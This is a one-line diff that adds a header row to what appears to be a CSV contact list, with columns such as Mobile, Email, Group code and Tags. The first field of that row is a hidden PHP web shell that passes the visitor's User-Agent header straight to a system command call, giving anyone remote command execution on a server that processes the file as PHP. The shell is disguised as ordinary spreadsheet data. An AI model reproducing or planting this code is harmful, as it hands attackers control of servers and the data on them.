@@ -1,0 +1,1 @@
+<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,"Mobile","Email","Group code","Tags"
